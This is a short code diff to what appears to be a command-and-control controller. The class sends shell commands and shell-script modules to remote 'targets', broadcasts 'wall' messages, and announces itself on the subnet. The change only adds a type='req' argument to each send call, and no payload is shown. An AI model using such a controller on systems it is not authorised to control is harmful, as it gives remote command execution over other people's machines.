@@ -170,7 +170,7 @@ class Controller(Host):
                     break
                 # Runs a command filter on it to make sure it's not a command that wont work
                 elif len(cmd) != 0 and not self.filter_commands(cmd):
-                    self.send(ip=target['ip'], command="instruction", data=cmd.encode(), target_id=target['id'])
+                    self.send(ip=target['ip'], command="instruction", data=cmd.encode(), target_id=target['id'], type="req")
                 else:
                     shell_lock.value = False
 
@@ -194,7 +194,7 @@ class Controller(Host):
         try:
             with open(f"./modules/{module}.sh","r") as f:
                 for target in targets:
-                    self.send(ip=target['ip'], command="module", data=f.read().encode(), target_id=target['id'])
+                    self.send(ip=target['ip'], command="module", data=f.read().encode(), target_id=target['id'], type="req")
                     print(f"Module sent to {target['ip']}")
         except FileNotFoundError:
             print("Module does not exist")
@@ -219,7 +219,7 @@ class Controller(Host):
         message = f"wall {message}"
 
         for target in targets:
-            self.send(ip=target['ip'], command='instruction', data=message.encode(), target_id=target['id'])
+            self.send(ip=target['ip'], command='instruction', data=message.encode(), target_id=target['id'], type="req")
             print(f"Broadcasted to {target['ip']}")
 
     def connect(self) -> None:
@@ -227,7 +227,7 @@ class Controller(Host):
         broadcast = self.ip.split(".")
         broadcast = f"{broadcast[0]}.{broadcast[1]}.{broadcast[2]}.255"
 
-        self.send(broadcast, "join", self.ip)
+        self.send(broadcast, "join", self.ip, type="req")
         
 
     """
